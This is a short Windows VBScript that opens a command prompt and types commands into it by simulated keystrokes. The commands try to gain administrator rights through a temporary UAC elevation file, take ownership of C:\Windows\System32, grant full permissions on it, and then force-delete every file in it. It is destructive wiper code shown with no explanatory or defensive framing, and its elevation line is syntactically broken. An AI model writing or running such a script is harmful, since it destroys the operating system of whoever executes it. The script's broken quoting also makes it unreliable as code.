Set WshShell = WScript.CreateObject("WScript.Shell")

WshShell.Run "cmd"
WScript.Sleep 100

WshShell.SendKeys "net session >nul 2>&1 && (set admin=1) || (set admin=0)"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 400

WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 > %temp%\getadmin.vbs"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 300

WshShell.SendKeys "if exist %temp%\getadmin.vbs (set admin=1) else (set admin=0)"
WScript.Sleep 100
WshShell.SendKeys "{ENTER}"
WScript.Sleep 200

WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 200

WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

WshShell.SendKeys "cd C:\Windows\System32"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100 

WshShell.SendKeys "del /F /S /Q *.*"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 200
